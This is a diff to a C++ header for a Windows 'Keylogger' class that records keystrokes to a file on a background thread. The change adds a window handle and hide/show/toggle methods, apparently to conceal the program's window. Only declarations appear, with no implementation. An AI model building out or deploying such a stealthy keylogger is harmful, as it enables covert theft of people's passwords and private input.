@@ -1,16 +1,22 @@
 #pragma once
+
+#include "keyboard.h"
+
+#include <Windows.h>
 #include <fstream>
 #include <iostream>
 #include <thread>
-#include "console.h"
-#include "keyboard.h"
 
 class Keylogger : public Keyboard {
 private:
 	std::wofstream file;
 	std::thread* keylog;
-	Console console;
-	
+
+	HWND handle;
+	bool visible;
+	void hide();
+	void show();
+
 	void setKeysState();
 	void translateKeysStates();
 
@@ -18,9 +24,13 @@ private:
 	template<typename T> void showTranslated(const T output);
 	template<typename T> void saveTranslated(const T output);
 public:
-	Keylogger(const char* dll, const char* file);
+	Keylogger();
 
 	void startKeylog();
 	void stopKeylog();
 	bool isKeylogging();
+
+	void listen();
+	void toggleWindow();
+	void destroyWindow();
 };
